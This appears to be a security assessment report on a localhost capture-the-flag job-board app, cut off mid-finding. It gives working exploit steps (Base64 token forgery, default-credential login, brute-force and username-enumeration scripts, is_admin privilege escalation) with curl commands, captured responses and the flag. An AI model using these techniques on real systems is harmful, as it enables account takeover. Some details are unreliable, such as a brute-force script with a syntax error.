# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:38803/
- **Assessment Date:** October 31, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

### Authentication Vulnerabilities:
**Critical vulnerabilities identified** - The application exhibits fundamental authentication security failures including:
- **Complete Authentication Bypass via Token Forgery (AUTH-VULN-01):** Base64-encoded tokens without cryptographic signatures allow attackers to forge valid authentication tokens for any user account, enabling complete bypass of authentication controls.
- **Admin Access via Default Credentials (AUTH-VULN-08):** Hardcoded admin account "company2/ajsdasd987asd87as7da9" provides immediate access to sensitive flag data.
- **Unlimited Brute Force Attacks (AUTH-VULN-06):** No rate limiting on authentication endpoint enables unlimited password guessing at 5.4+ requests/second.
- **No Account Lockout (AUTH-VULN-07):** Accounts never lock despite unlimited failed login attempts, facilitating persistent password spraying attacks.
- **Username Enumeration via Timing Side-Channel (AUTH-VULN-09):** Valid usernames show 12x longer response times (128ms vs 10ms) due to bcrypt verification, enabling systematic username discovery.
- **Session Fixation (AUTH-VULN-10):** Deterministic token generation produces identical tokens across logins, enabling session fixation attacks.
- **Token Replay Attacks (AUTH-VULN-02):** Tokens never expire and remain valid indefinitely, allowing stolen tokens to provide permanent unauthorized access.
- **No Token Expiration (AUTH-VULN-13):** Despite defining ACCESS_TOKEN_EXPIRE_MINUTES=30, expiration is never implemented or enforced.
- **Session Hijacking via Insecure Transmission (AUTH-VULN-04):** Missing Secure flag and HTTP-only communication allows man-in-the-middle interception of session cookies.
- **Weak Password Policy (AUTH-VULN-14):** No complexity requirements allow 4-character passwords, dictionary words, and trivial patterns.
- **Missing Logout Functionality (AUTH-VULN-11):** No logout endpoint exists, preventing users from terminating sessions or revoking compromised tokens.

**Impact:** These vulnerabilities enable complete authentication bypass, unauthorized access to all user accounts including admin accounts containing sensitive flag data, and persistent unauthorized access with no revocation capability.

### Authorization Vulnerabilities:
**Critical authorization failures identified** - The application demonstrates severe authorization bypass vulnerabilities:
- **Vertical Privilege Escalation via Self-Elevation (AUTHZ-VULN-04):** Any authenticated user can elevate themselves to administrator status by manipulating the `is_admin` parameter in profile update requests, granting access to private jobs containing CTF flags.
- **Horizontal IDOR - Jobs Access (AUTHZ-VULN-01):** Forged tokens enable unauthorized access to any company's job listings including private admin jobs with flag data.
- **Horizontal IDOR - Profile Viewing (AUTHZ-VULN-02):** Attackers can view any company's profile information including admin status using forged tokens.
- **Horizontal IDOR - Profile Modification (AUTHZ-VULN-03):** Attackers can modify any company's profile including name and admin status using forged tokens, enabling complete account takeover.

**Impact:** Complete breach of multi-tenant data isolation, with attackers able to access and modify all companies' data, escalate privileges to admin level, and gain unauthorized access to sensitive flag information.

### Cross-Site Scripting (XSS) Vulnerabilities:
**No XSS vulnerabilities were found.** The application properly implements XSS defenses through FastAPI's default Jinja2 template configuration with autoescape enabled. All user-controlled data rendered in HTML templates is automatically escaped, converting potentially dangerous characters to HTML entities. This provides effective protection against reflected and stored XSS attacks.

### SQL/Command Injection Vulnerabilities:
**No SQL or command injection vulnerabilities were found.** All database operations use SQLAlchemy ORM with parameterized queries, providing complete protection against SQL injection. The application does not execute shell commands or spawn subprocesses based on user input, eliminating command injection attack surface.

### Server-Side Request Forgery (SSRF) Vulnerabilities:
**No SSRF vulnerabilities were found.** The application does not make user-influenced outbound HTTP requests. While HTTP client libraries are present in dependencies, they are never imported or used in the application code. The application has no functionality that fetches external URLs, performs webhook callbacks, or makes server-side requests based on user input.

## Network Reconnaissance

### Open Ports and Exposed Services
The nmap scan identified multiple exposed services on the target host. Security-relevant findings include:

- **Port 22/tcp - SSH (OpenSSH 9.9):** Standard SSH service with ECDSA and ED25519 host keys exposed.
- **Port 80/tcp - HTTP (Caddy httpd):** Caddy web server exposing HTTP service without title information.
- **Port 443/tcp - SSL/HTTPS:** HTTPS service exposed but returning no title (potential misconfiguration).
- **Port 445/tcp - Microsoft-DS:** SMB service exposed with message signing enabled and required (SMB2 protocol 3.0.2).
- **Port 631/tcp - CUPS 2.3:** Printing service exposing administrative interface with robots.txt disallowing root path.
- **Port 3703/tcp - Unknown Service:** Custom service requiring "baml-original-url" header, responding with CORS headers and JSON error messages.
- **Port 8000-8001/tcp - Python WSGIServer:** Multiple Python WSGI servers (version 0.2) serving "SSTI Demo" applications - potentially vulnerable test environments.
- **Port 8888/tcp - BaseHTTPServer:** Python-based "SSRF Test Server" - appears to be a testing/demonstration environment.
- **Port 9999/tcp - SimpleHTTPServer:** Python SimpleHTTPServer exposing directory listings.

**Target Application:** The assessment focused on **port 38803** (not shown in general scan) running the FastAPI job board application via Uvicorn ASGI server.

### Security Headers and Misconfigurations
Technology detection via whatweb revealed:
- **Framework:** FastAPI application served by Uvicorn
- **Frontend:** Bootstrap 4.5.2 loaded from external CDN (StackPath) without Subresource Integrity (SRI) hashes
- **Server Headers:** HTTP Server header exposes "uvicorn" version information
- **Missing Security Headers:** No evidence of HSTS, CSP, X-Frame-Options, or other security headers
- **Form Security:** Login page contains password field but lacks CSRF protection

### Attack Surface Expansion Risks
- **Multiple Test Servers:** Ports 8000, 8001, 8888, and 9999 expose Python-based test servers for SSTI and SSRF testing, potentially expanding attack surface if accessible
- **SMB Exposure:** Port 445 exposes SMB protocol which historically has security vulnerabilities
- **Printing Service:** CUPS 2.3 administrative interface on port 631 could be targeted for privilege escalation
- **Clock Skew:** Host exhibits -2m26s clock skew which may impact time-based security controls

### Key Security Observations
- Application runs on HTTP without TLS encryption
- No subdomain discoveries that could expand attack surface
- Multiple Python-based services suggest development/testing environment rather than hardened production deployment
- External CDN dependency (StackPath for Bootstrap) without integrity validation introduces supply chain risk

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Complete Authentication Bypass via Token Forgery

**Summary:**
- **Vulnerable location:** Token generation function at `/app/main.py:40-41`
- **Overview:** The application uses Base64 encoding instead of cryptographically signed tokens, allowing attackers to forge valid authentication tokens for any user account without credentials
- **Impact:** Complete authentication bypass enabling access to any user account including admin accounts with flag data
- **Severity:** CRITICAL

**Prerequisites:** None - attack requires only HTTP client and base64 encoding capability

**Exploitation Steps:**

1. Identify target company ID (e.g., admin account is company_id=2)

2. Generate forged token using base64 encoding:
```bash
python3 -c "import base64; print(base64.b64encode(b'2').decode())"
# Output: Mg==
```

3. Use forged token to access admin account without authentication:
```bash
curl -i http://localhost:38803/company/2/jobs \
  -H "Cookie: access_token=Bearer Mg=="
```

4. Verify unauthorized access by checking response contains private jobs with flag

**Proof of Impact:**

Successfully accessed admin account (company_id=2) and extracted flag without any credentials:
```
Flag captured: flag{0d8ca439-1cc2-4de9-a83f-08182aede041}
```

Response confirmed access to private job data:
```html
<li class="list-group-item">
    <p>secret:flag{0d8ca439-1cc2-4de9-a83f-08182aede041}</p>
</li>
```

Token forgery works for all accounts:
- Company 1: `echo -n "1" | base64` → `MQ==` (demo account)
- Company 2: `echo -n "2" | base64` → `Mg==` (admin account)
- Company 3: `echo -n "3" | base64` → `Mw==` (company3 account)

All forged tokens successfully granted access to respective accounts without authentication.

**Notes:** This vulnerability renders all other authentication controls meaningless. The token validation function only checks format and URL parameter match, but provides no security since tokens can be forged at will.

---

### AUTH-VULN-08: Admin Access via Default Credentials with Flag Capture

**Summary:**
- **Vulnerable location:** Startup event handler at `/app/main.py:58-62` with hardcoded credentials
- **Overview:** Application contains three hardcoded accounts created on every startup, including admin account "company2" with predictable password providing direct access to flag data
- **Impact:** Immediate admin access and flag capture using publicly known credentials
- **Severity:** CRITICAL

**Prerequisites:** None

**Exploitation Steps:**

1. Authenticate using default admin credentials:
```bash
curl -i -X POST http://localhost:38803/token \
  -d "username=company2&password=ajsdasd987asd87as7da9" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c /tmp/admin_cookies.txt
```

Expected response: HTTP 303 redirect with Set-Cookie header containing access token

2. Access admin's private jobs containing flag:
```bash
curl http://localhost:38803/company/2/jobs \
  -b /tmp/admin_cookies.txt
```

**Proof of Impact:**

Login successful with response:
```
HTTP/1.1 303 See Other
location: /company/2/jobs
set-cookie: access_token="Bearer Mg=="; HttpOnly; Path=/; SameSite=lax
```

Flag extracted from admin's private jobs:
```
secret:flag{0d8ca439-1cc2-4de9-a83f-08182aede041}
```

**Default Credentials Table:**
| Username | Password | Admin Status | Company ID | Impact |
|----------|----------|--------------|------------|--------|
| demo | demo | No | 1 | Regular user access |
| company2 | ajsdasd987asd87as7da9 | **Yes** | 2 | **Admin access to flag** |
| company3 | password3 | No | 3 | Regular user access |

**Notes:** All three accounts are recreated on every application restart with the same credentials. The company2 account has `is_admin=True` flag granting access to private jobs containing the CTF flag.

---

### AUTH-VULN-06: Unlimited Brute Force via Missing Rate Limiting

**Summary:**
- **Vulnerable location:** POST /token endpoint at `/app/main.py:87-97` with no rate limiting middleware
- **Overview:** Authentication endpoint accepts unlimited login attempts without throttling, delays, or blocking, enabling practical brute-force and credential stuffing attacks
- **Impact:** Attackers can perform unlimited password guessing attacks at high speed without restriction
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Create Python script to perform rapid authentication attempts (automated via Task Agent)

2. Execute 100+ rapid-fire login attempts against target account:
```python
import requests

target = "http://localhost:38803/token"
username = "demo"
password_list = ["wrongpass" + str(i) for i in range(100)] + ["demo"]

for attempt, password in enumerate(password_list, 1):
    response = requests.post(
        target,
        data={"username": username, "password": password},
        headers={"Content-Type": application/x-www-form-urlencoded"},
        allow_redirects=False
    )
    print(f"Attempt {attempt}: Status {response.status_code}")
```

3. Verify no rate limiting by observing all requests are processed without delays or 429 responses

4. Confirm successful authentication after 100 failed attempts (no account lockout)

**Proof of Impact:**

Test execution results:
- **Total Attempts:** 102 (100 failed + 2 successful)
- **Duration:** 18.84 seconds
- **Request Rate:** 5.41 requests/second
- **Average Response Time:** 0.185 seconds
- **Rate Limiting Detected:** No
- **HTTP 429 Responses:** 0
- **Account Locked:** No
- **Final Authentication:** SUCCESS

All 100 failed login attempts were accepted without blocking. The correct password succeeded immediately after, proving no account lockout mechanism exists.

**Notes:** Combined with weak password policy (AUTH-VULN-14), this enables practical dictionary attacks. The absence of rate limiting also facilitates user enumeration (AUTH-VULN-09) and password spraying (AUTH-VULN-07).

---

### AUTH-VULN-07: No Account Lockout - Password Spraying Successful

**Summary:**
- **Vulnerable location:** No account lockout mechanism in database schema (models.py) or authentication logic (main.py)
- **Overview:** Accounts never lock regardless of failed login attempts, allowing persistent password guessing attacks against individual accounts
- **Impact:** Attackers can continuously attempt authentication without consequence, enabling targeted attacks against high-value accounts
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Perform 100+ failed authentication attempts against target account (see AUTH-VULN-06 exploitation)

2. Verify account remains active by attempting successful login:
```bash
curl -i -X POST http://localhost:38803/token \
  -d "username=demo&password=demo" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

3. Confirm HTTP 303 redirect indicating successful authentication (no lockout)

**Proof of Impact:**

After 100 consecutive failed login attempts, the demo account successfully authenticated:
```
HTTP/1.1 303 See Other
location: /company/1/jobs
set-cookie: access_token="Bearer MQ=="; HttpOnly; Path=/; SameSite=lax
```

Database schema at `/app/models.py:6-12` shows Company model has no lockout-related fields:
- No `failed_login_count` field
- No `account_locked` boolean
- No `lockout_timestamp` field

The authenticate_company function at `/app/main.py:44-50` simply returns False on failure with no side effects to track attempts.

**Notes:** Combined with no rate limiting (AUTH-VULN-06), attackers can perform unlimited password attempts against any account indefinitely.

---

### AUTH-VULN-09: Username Enumeration via Timing Side-Channel

**Summary:**
- **Vulnerable location:** authenticate_company function at `/app/main.py:44-50` with observable timing difference
- **Overview:** Non-existent users return immediately (~10ms) while valid users with wrong passwords take ~128ms due to bcrypt verification, allowing username enumeration
- **Impact:** Attackers can build list of valid usernames to focus attacks, violating user privacy
- **Severity:** MEDIUM

**Prerequisites:** None

**Exploitation Steps:**

1. Create Python script to measure response times for authentication attempts (automated via Task Agent)

2. Test valid and invalid usernames with intentionally wrong password:
```python
import requests
import time

target = "http://localhost:38803/token"
test_users = {
    "valid": ["demo", "company2", "company3"],
    "invalid": ["nonexistent1", "nonexistent2", "fakeuser"]
}

for category, usernames in test_users.items():
    for username in usernames:
        times = []
        for i in range(10):
            start = time.time()
            requests.post(target, data={"username": username, "password": "wrongpass"})
            times.append(time.time() - start)
        avg_time = sum(times) / len(times)
        print(f"{category} - {username}: {avg_time:.3f}s")
```

3. Analyze timing differences to identify valid usernames

**Proof of Impact:**

Timing analysis results (10 attempts per username):

**Valid Usernames:**
- demo: Average 0.128 seconds (128ms)
- company2: Average 0.131 seconds (131ms)
- company3: Average 0.125 seconds (125ms)
- **Valid users average: 0.128 seconds (128ms)**

**Invalid Usernames:**
- nonexistent1: Average 0.010 seconds (10ms)
- nonexistent2: Average 0.009 seconds (9ms)
- fakeuser: Average 0.010 seconds (10ms)
- **Invalid users average: 0.010 seconds (10ms)**

**Timing Difference:** 118 milliseconds (1211% difference - valid users take 12x longer)

This clear, measurable difference allows attackers to definitively enumerate valid usernames.

**Root Cause:** Lines 46-47 return False immediately for non-existent users, while line 48 performs expensive bcrypt verification for existing users, creating CWE-208 timing side-channel.

**Notes:** Combined with no rate limiting (AUTH-VULN-06), attackers can rapidly enumerate all usernames in the system for targeted attacks.

---

### AUTH-VULN-10: Session Fixation via Deterministic Token Generation

**Summary:**
- **Vulnerable location:** create_access_token function at `/app/main.py:40-41` using deterministic Base64 encoding
- **Overview:** Tokens are deterministic - the same user always receives identical token regardless of when they login, enabling session fixation attacks
- **Impact:** Attackers can pre-calculate tokens and perform session fixation or predict future session tokens
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Login as target user (demo) and capture token:
```bash
curl -i -X POST http://localhost:38803/token \
  -d "username=demo&password=demo" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c /tmp/login1.txt
```

2. Login again as the same user and capture second token:
```bash
curl -i -X POST http://localhost:38803/token \
  -d "username=demo&password=demo" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c /tmp/login2.txt
```

3. Compare tokens - they should be identical:
```bash
grep access_token /tmp/login1.txt
grep access_token /tmp/login2.txt
```

**Proof of Impact:**

First login response:
```
set-cookie: access_token="Bearer MQ=="; HttpOnly; Path=/; SameSite=lax
```

Second login response (identical token):
```
set-cookie: access_token="Bearer MQ=="; HttpOnly; Path=/; SameSite=lax
```

Both logins produced identical token `Bearer MQ==`, proving deterministic generation.

**Token Predictability Table:**
| User | Company ID | Token (Always) | Predictable |
|------|------------|----------------|-------------|
| demo | 1 | Bearer MQ== | Yes |
| company2 | 2 | Bearer Mg== | Yes |
| company3 | 3 | Bearer Mw== | Yes |

**Root Cause:** Token generation uses only `base64.b64encode(str(company_id).encode())` with no randomness, nonce, timestamp, or session identifier.

**Notes:** This also enables token forgery (AUTH-VULN-01) since tokens are not only deterministic but also lack cryptographic signatures.

---

### AUTH-VULN-02: Token Replay - Persistent Unauthorized Access

**Summary:**
- **Vulnerable location:** Token validation at `/app/main.py:131-149` with no expiration checking
- **Overview:** Authentication tokens never expire and remain valid indefinitely, allowing stolen or old tokens to be replayed for persistent access
- **Impact:** Compromised tokens provide permanent unauthorized access with no time limitation
- **Severity:** HIGH

**Prerequisites:** Valid or forged token (easily obtained via AUTH-VULN-01)

**Exploitation Steps:**

1. Obtain any valid token (via forgery or legitimate login):
```bash
# Create forged token
TOKEN="Bearer MQ=="
```

2. Wait arbitrary time period (demonstrated: 5+ seconds)

3. Use token after delay to verify no expiration:
```bash
sleep 5
curl http://localhost:38803/company/1/jobs \
  -H "Cookie: access_token=$TOKEN"
```

4. Verify successful access despite time elapsed

**Proof of Impact:**

Token created at timestamp T0, tested at T0+5 seconds:
```bash
# After 5 second delay
curl -s http://localhost:38803/company/1/jobs -H "Cookie: access_token=Bearer MQ=="
```

Response confirmed access:
```html
<h2>Jobs for Company 1</h2>
```

Admin token from initial exploitation (timestamp T0) still works at test conclusion (timestamp T0+15 minutes):
```bash
curl -s http://localhost:38803/company/2/jobs -b /tmp/admin_cookies.txt
```

Response:
```
secret:flag{0d8ca439-1cc2-4de9-a83f-08182aede041}
```

**Code Analysis:**
- ACCESS_TOKEN_EXPIRE_MINUTES constant defined at line 17 but never used
- Token validation function (lines 131-149) performs no expiration checking
- No timestamp or expiration claim in token payload
- Cookie set with no `max_age` or `expires` parameter (line 96)

**Notes:** Combined with missing logout functionality (AUTH-VULN-11), tokens remain valid forever with no mechanism for revocation.

---

### AUTH-VULN-13: No Token Expiration - Indefinite Session Validity

**Summary:**
- **Vulnerable location:** create_access_token at `/app/main.py:40-41` and validate_token at lines 131-149
- **Overview:** Despite ACCESS_TOKEN_EXPIRE_MINUTES=30 constant being defined, token expiration is never implemented or enforced
- **Impact:** Stolen tokens valid forever, no automatic session termination, permanent unauthorized access risk
- **Severity:** HIGH

**Prerequisites:** Any token (forged or legitimate)

**Exploitation Steps:**

1. Generate or capture authentication token

2. Verify ACCESS_TOKEN_EXPIRE_MINUTES constant exists but is unused:
```bash
grep "ACCESS_TOKEN_EXPIRE_MINUTES" /app/main.py
# Shows: ACCESS_TOKEN_EXPIRE_MINUTES = 30
grep "ACCESS_TOKEN_EXPIRE_MINUTES" /app/main.py -A 50
# Shows constant is never referenced in token creation or validation
```

3. Use token after arbitrary time period to confirm no expiration enforcement

**Proof of Impact:**

Source code analysis:
```python
# Line 17: Constant defined but never used
ACCESS_TOKEN_EXPIRE_MINUTES = 30

# Lines 40-41: Token creation with no expiration
def create_access_token(data: str):
    return base64.b64encode(data.encode()).decode()
    # No datetime, no expiration claim, no timeout

# Lines 131-149: Token validation with no expiration check
async def validate_token(company_id, request):
    token = request.cookies.get("access_token")
    # ... decode token ...
    # No expiration verification
```

Tokens remain valid indefinitely as demonstrated by successful access after extended time periods (combined with AUTH-VULN-02 test results).

**Notes:** This vulnerability is intrinsic to the Base64-only token design. Proper JWT implementation would include `exp` claim that gets validated.

---

### AUTH-VULN-04: Session Hijacking via Insecure Cookie Transmission

**Summary:**
- **Vulnerable location:** Cookie configuration at `/app/main.py:96` missing Secure flag
- **Overview:** Session cookies lack Secure flag and application runs on HTTP, allowing session tokens to be transmitted in cleartext and intercepted via network attacks
- **Impact:** Attackers on network path can capture session cookies and hijack user sessions
- **Severity:** HIGH

**Prerequisites:** Network access (simulated via localhost testing)

**Exploitation Steps:**

1. Simulate victim authentication and capture cookie (representing MITM network interception):
```bash
curl -s -c /tmp/victim_cookie.txt -X POST http://localhost:38803/token \
  -d "username=company2&password=ajsdasd987asd87as7da9" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

2. Extract captured session token:
```bash
cat /tmp/victim_cookie.txt | grep access_token
# Shows: access_token	"Bearer Mg=="
```

3. Attacker uses stolen cookie to hijack admin session:
```bash
curl http://localhost:38803/company/2/jobs \
  -H 'Cookie: access_token="Bearer Mg=="'
```

4. Verify unauthorized access to victim's account and sensitive data

**Proof of Impact:**

Cookie file shows cleartext transmission:
```
#HttpOnly_localhost	FALSE	/	FALSE	0	access_token	"Bearer Mg=="
```

Using stolen cookie to access admin account:
```bash
curl -s http://localhost:38803/company/2/jobs -H 'Cookie: access_token="Bearer Mg=="'
```

Response confirms session hijacking:
```
secret:flag{0d8ca439-1cc2-4de9-a83f-08182aede041}
```

Attacker successfully hijacked admin session and accessed private flag data using intercepted cookie.

**Root Cause:**
- Line 96: `response.set_cookie(key="access_token", value=..., httponly=True)`
- Missing `secure=True` flag
- Application runs on HTTP (Dockerfile line 14: port 80)
- All traffic including cookies transmitted in cleartext

**Notes:** In real network scenarios, attackers on shared WiFi, compromised routers, or ISP-level positions can intercept these cleartext cookies.

---

### AUTH-VULN-14: Weak Password Policy - No Complexity Requirements

**Summary:**
- **Vulnerable location:** CompanyCreate schema at `/app/schemas.py:17-20` with no password validators
- **Overview:** Application accepts passwords of any length including 1-character passwords, dictionary words, and trivial patterns without any complexity requirements
- **Impact:** User accounts vulnerable to dictionary attacks and trivial password guessing
- **Severity:** MEDIUM

**Prerequisites:** None (demonstrates existing weak passwords and lack of policy)

**Exploitation Steps:**

1. Test existing weak passwords are accepted (automated via Task Agent Python script):
```python
test_cases = [
    ("demo", "demo"),  # 4 characters
    ("company3", "password3"),  # Dictionary word
]

for username, password in test_cases:
    response = requests.post(
        "http://localhost:38803/token",
        data={"username": username, "password": password}
    )
    print(f"{username}/{password}: {'SUCCESS' if response.status_code == 303 else 'FAIL'}")
```

2. Attempt dictionary attack with common weak passwords:
```python
weak_passwords = ["123456", "password", "admin", "letmein", "welcome", "abc123"]
for pwd in weak_passwords:
    response = requests.post(target, data={"username": "demo", "password": pwd})
    # All attempts accepted without rejection
```

3. Verify no password complexity enforcement exists

**Proof of Impact:**

Test results:
- **4-character password "demo":** SUCCESS (HTTP 200)
- **Dictionary word "password3":** SUCCESS (HTTP 200)
- **Common weak passwords tested:** 6/6 accepted (100%)

Additional weak patterns accepted:
- Single character passwords: ACCEPTED
- Two character passwords: ACCEPTED
- Repeated characters (aaaa): ACCEPTED
- Sequential numbers (1234): ACCEPTED

**Conclusion:** Password policy enforcement is ABSENT

Source code shows no validation:
```python
# /app/schemas.py:19
password: str  # No Field validators, no length check, no complexity requirements
```

**Notes:** Combined with no rate limiting (AUTH-VULN-06) and no account lockout (AUTH-VULN-07), weak passwords make brute-force attacks highly effective.

---

### AUTH-VULN-11: Missing Logout Functionality - No Session Termination

**Summary:**
- **Vulnerable location:** No logout endpoint exists in application
- **Overview:** Users cannot terminate their sessions as no logout functionality is implemented
- **Impact:** Compromised tokens cannot be revoked, sessions persist indefinitely on shared computers, no way to invalidate stolen credentials
- **Severity:** MEDIUM

**Prerequisites:** None

**Exploitation Steps:**

1. Search for logout endpoints:
```bash
curl -s -o /dev/null -w "Status: %{http_code}" http://localhost:38803/logout
curl -s -o /dev/null -w "Status: %{http_code}" http://localhost:38803/signout
curl -s -o /dev/null -w "Status: %{http_code}" http://localhost:38803/auth/logout
```

2. Verify all return HTTP 404 (Not Found)

3. Review application routes to confirm no logout endpoint exists

**Proof of Impact:**

Logout endpoint tests:
```
/logout: Status: 404
/signout: Status: 404
```

Source code analysis confirms no logout endpoint in `/app/main.py`:
- Only endpoints: `/`, `/token`, `/ping`, `/company/{id}/jobs`, `/edit_profile/{id}`
- No logout route defined
- No cookie deletion functionality
- No session invalidation mechanism

Application architecture analysis:
- No sessions table in database (models.py)
- No server-side session storage
- Tokens are stateless with no revocation capability
- Cookie has no `delete_cookie` or `clear_cookie` implementation

**Impact Scenarios:**
1. User on shared computer cannot log out - session remains active
2. If user suspects credential compromise, no way to invalidate token
3. Stolen tokens (via AUTH-VULN-04) cannot be revoked
4. Admin discovers unauthorized access but cannot force logout

**Notes:** Combined with no token expiration (AUTH-VULN-13), sessions effectively last forever with no termination mechanism.

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-05: Complete Authentication Bypass via Token Forgery

**Summary:**
- **Vulnerable location:** Token validation mechanism at `/app/main.py:145-146` and token creation at `/app/main.py:40-41`
- **Overview:** The application uses simple base64 encoding for authentication tokens instead of cryptographic signatures, allowing attackers to forge valid tokens for any user without credentials
- **Impact:** Complete authentication bypass - attackers can access any account including admin accounts containing sensitive flag data without knowing passwords
- **Severity:** Critical

**Prerequisites:**
None - can be exploited from completely unauthenticated state

**Exploitation Steps:**

1. Identify target company ID (predictable sequential integers: 1, 2, 3...)
   - Company 2 is known to be an admin account from seed data

2. Generate forged token for target company:
```bash
python3 -c "import base64; print(base64.b64encode(b'2').decode())"
# Output: Mg==
```

3. Access target company's resources using forged token:
```bash
curl -X GET 'http://localhost:38803/company/2/jobs' \
  -H 'Cookie: access_token=Bearer Mg=='
```

**Proof of Impact:**

Successfully accessed company 2 (admin account) jobs without authentication, retrieving:
- Public job: "company2 Job 1"
- Private job titled "secret" containing: **flag{0d8ca439-1cc2-4de9-a83f-08182aede041}**

The response showed:
```html
<h2>Jobs for Company 2</h2>
<ul class="list-group">
    <li class="list-group-item">
        <p>company2 Job 1:company2 Job 1 Description</p>
    </li>
    <li class="list-group-item">
        <p>secret:flag{0d8ca439-1cc2-4de9-a83f-08182aede041}</p>
    </li>
</ul>
```

**Notes:**
This vulnerability completely undermines all authentication controls. The token validation only checks if the base64-decoded value matches the URL parameter, but never verifies the token was legitimately issued by the server. Despite importing `jose.jwt` library and defining a `SECRET_KEY`, the application never uses cryptographic signing.

---

### AUTHZ-VULN-04: Vertical Privilege Escalation via Self-Elevation

**Summary:**
- **Vulnerable location:** Profile update endpoint at `/app/main.py:158`
- **Overview:** Any authenticated user can elevate themselves to administrator status by manipulating the `is_admin` parameter in profile update requests
- **Impact:** Regular users gain admin privileges, enabling access to private jobs containing CTF flags
- **Severity:** Critical

**Prerequisites:**
Valid authentication session (can be obtained via legitimate login or token forgery from AUTHZ-VULN-05)

**Exploitation Steps:**

1. Authenticate as regular user:
```bash
curl -X POST 'http://localhost:38803/token' \
  -d 'username=demo&password=demo'
# Receives cookie: access_token="Bearer MQ=="
```

2. Verify current non-admin status by checking jobs (should only see public jobs):
```bash
curl -X GET 'http://localhost:38803/company/1/jobs' \
  -H 'Cookie: access_token=Bearer MQ=='
# Shows only 1 public job (no private jobs visible)
```

3. Elevate privileges via profile update with `is_admin=1`:
```bash
curl -X POST 'http://localhost:38803/edit_profile/1' \
  -H 'Cookie: access_token=Bearer MQ==' \
  -d 'name=demo&is_admin=1'
```

4. Verify privilege escalation by accessing jobs again:
```bash
curl -X GET 'http://localhost:38803/company/1/jobs' \
  -H 'Cookie: access_token=Bearer MQ=='
# Now shows 2 jobs including private "secret" job with flag
```

**Proof of Impact:**

**Before privilege escalation:** Only 1 public job visible
```html
<li class="list-group-item">
    <p>demo Job 1:demo Job 1 Description</p>
</li>
```

**After privilege escalation:** 2 jobs visible including private job with flag
```html
<li class="list-group-item">
    <p>demo Job 1:demo Job 1 Description</p>
</li>
<li class="list-group-item">
    <p>secret:flag{0d8ca439-1cc2-4de9-a83f-08182aede041}</p>
</li>
```

The profile update response confirmed successful elevation:
```html
<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>
<select class="form-control" id="is_admin" name="is_admin">
    <option value="0">Regular</option>
    <option value="1" selected>Admin</option>
</select>
```

**Notes:**
The server blindly accepts the `is_admin` parameter from user input without any authorization check. The client-side HTML has a `disabled` attribute on the admin dropdown for non-admin users, but this provides zero server-side protection and is trivially bypassed by direct HTTP requests.

---

### AUTHZ-VULN-01: Horizontal IDOR - Unauthorized Access to Other Companies' Jobs

**Summary:**
- **Vulnerable location:** Token validation mechanism at `/app/main.py:145-146`
- **Overview:** By forging authentication tokens for other company IDs, attackers can access any company's job listings including private jobs for admin companies
- **Impact:** Complete breach of multi-tenant data isolation - attackers can enumerate and access all companies' job data
- **Severity:** High

**Prerequisites:**
Knowledge of base64 encoding (publicly documented standard)

**Exploitation Steps:**

1. Generate forged tokens for target companies:
```bash
# Token for company 1
python3 -c "import base64; print(base64.b64encode(b'1').decode())"
# Output: MQ==

# Token for company 3
python3 -c "import base64; print(base64.b64encode(b'3').decode())"
# Output: Mw==
```

2. Access company 3's jobs using forged token:
```bash
curl -X GET 'http://localhost:38803/company/3/jobs' \
  -H 'Cookie: access_token=Bearer Mw=='
```

3. Enumerate all companies systematically (1, 2, 3...) until receiving 404/unauthorized responses

**Proof of Impact:**

Successfully accessed company 3's jobs without authorization:
```html
<h2>Jobs for Company 3</h2>
<ul class="list-group">
    <li class="list-group-item">
        <p>company3 Job 1:company3 Job 1 Description</p>
    </li>
</ul>
```

Successfully accessed company 1's jobs (after earlier privilege escalation):
```html
<h2>Jobs for Company 1</h2>
<ul class="list-group">
    <li class="list-group-item">
        <p>demo Job 1:demo Job 1 Description</p>
    </li>
    <li class="list-group-item">
        <p>secret:flag{0d8ca439-1cc2-4de9-a83f-08182aede041}</p>
    </li>
</ul>
```

**Notes:**
This combines the token forgery vulnerability (AUTHZ-VULN-05) with the jobs endpoint to demonstrate horizontal privilege escalation. The application correctly filters jobs by company_id, but the company_id parameter is controlled by the forged token, making the filtering ineffective.

---

### AUTHZ-VULN-02: Horizontal IDOR - Unauthorized Access to Other Companies' Profiles

**Summary:**
- **Vulnerable location:** Token validation at `/app/main.py:145-146` in edit_profile GET endpoint
- **Overview:** Forged tokens enable attackers to view any company's profile information including admin status
- **Impact:** Information disclosure revealing company names and privilege levels - enables targeted attacks
- **Severity:** Medium

**Prerequisites:**
Ability to forge tokens (via base64 encoding)

**Exploitation Steps:**

1. Generate forged token for target company:
```bash
python3 -c "import base64; print(base64.b64encode(b'2').decode())"
# Output: Mg==
```

2. Access target company's profile:
```bash
curl -X GET 'http://localhost:38803/edit_profile/2' \
  -H 'Cookie: access_token=Bearer Mg=='
```

**Proof of Impact:**

Successfully accessed company 2's profile, revealing:
- Company name: "company2"
- Admin status: Admin (selected option shows `value="1" selected`)

```html
<h2>Edit Profile</h2>
<form method="post" action="/edit_profile/2">
    <div class="form-group">
        <label for="name">Company Name</label>
        <input type="text" class="form-control" id="name" name="name" value="company2" required>
    </div>
    <div class="form-group">
        <label for="is_admin">Admin Status</label>
        <select class="form-control" id="is_admin" name="is_admin">
            <option value="0">Regular</option>
            <option value="1" selected>Admin</option>
        </select>
    </div>
</form>
```

**Notes:**
While less severe than write-based IDOR, this information disclosure enables attackers to identify high-value targets (admin companies) for further exploitation. It also confirms the existence and IDs of companies in the system.

---

### AUTHZ-VULN-03: Horizontal IDOR - Unauthorized Modification of Other Companies' Profiles

**Summary:**
- **Vulnerable location:** Token validation at `/app/main.py:145-146` and missing ownership check at line 158
- **Overview:** Attackers can modify any company's profile including their name and admin status using forged tokens
